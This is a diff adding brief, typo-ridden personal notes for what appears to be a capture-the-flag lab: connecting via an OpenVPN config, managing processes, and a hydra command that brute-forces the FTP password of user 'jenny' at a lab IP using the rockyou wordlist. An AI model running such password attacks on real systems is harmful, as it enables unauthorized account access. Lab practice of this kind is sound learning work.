@@ -1,0 +1,13 @@
+To add the Vpn 
+start the machine--ip address
+cd Desktop
+ll
+sudo openvpn dharan.ovpn ---> add the folder in the fikle is saved
+
+hydra -l jenny -P rockyou.txt 10.10.205.12 ftp -t 64 --->add your ip address
+ps -->to check the running process
+ps aux
+ps aux | grep openvpn ---> To know the process running
+ip a
+to delete the process(tunnel) :
+kill -9 process number
